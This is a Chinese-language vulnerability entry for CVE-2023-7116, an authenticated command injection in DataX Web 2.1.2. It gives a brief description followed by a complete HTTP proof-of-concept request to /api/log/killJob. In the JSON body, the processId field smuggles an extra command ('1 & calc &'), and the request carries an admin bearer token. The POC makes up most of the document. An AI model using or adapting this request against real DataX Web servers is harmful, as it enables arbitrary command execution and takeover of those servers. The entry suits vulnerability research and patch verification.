# CVE-2023-7116

>DataX Web是在DataX之上开发的分布式数据同步工具，提供简单易用的 操作界面，降低用户使用DataX的学习成本，缩短任务配置时间，避免配置过程中出错。

## 来源

[https://medium.com/@2839549219ljk/rec-vulnerability-e8f2e1033b1f](https://medium.com/@2839549219ljk/rec-vulnerability-e8f2e1033b1f)

## 简介

DataX Web在2.1.2版本中存在命令注入漏洞，经过身份认证的攻击者可以通过访问/api/log/killJob路由构造恶意的请求包，利用命令拼接的方式进行执行任意命令，控制服务器的权限。

## 漏洞类型

命令注入

## 漏洞影响版本

-   DataX Web 2.1.2

## POC

```http
POST /api/log/killJob HTTP/1.1 
Host: 127.0.0.1:8081 
sec-ch-ua: "(Not(A:Brand";v="8", "Chromium";v="99" 
Accept: application/json, text/plain, */* 
Authorization: Bearer eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiIxLGFkbWluIiwiaXNzIjoiYWRtaW4iLCJleHAiOjE2OTk0OTg4NDQsImlhdCI6MTY5ODg5NDA0NCwicm9sIjoiUk9MRV9BRE1JTiJ9.n9IZNBozn7PifuzOeukA3eMNlIowUDGzexBTVYLxk-N2muBW0eSTD06aLP8Mq7EPSfrbcm9Vw3iit2CR78ayBA 
sec-ch-ua-mobile: ?0 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 
sec-ch-ua-platform: "Windows" 
Origin: http://127.0.0.1:8081 
Sec-Fetch-Site: same-origin 
Sec-Fetch-Mode: cors 
Sec-Fetch-Dest: empty 
Referer: http://127.0.0.1:8081/index.html 
Accept-Encoding: gzip, deflate 
Accept-Language: zh-CN,zh;q=0.9 
Cookie: 
Connection: close 
Content-Type: application/json 
Content-Length: 97 
 
{"processId":"1 & calc &","triggerTime":"2023-10-31 10:11:00","executorAddress":"127.0.0.1:9999"}
```

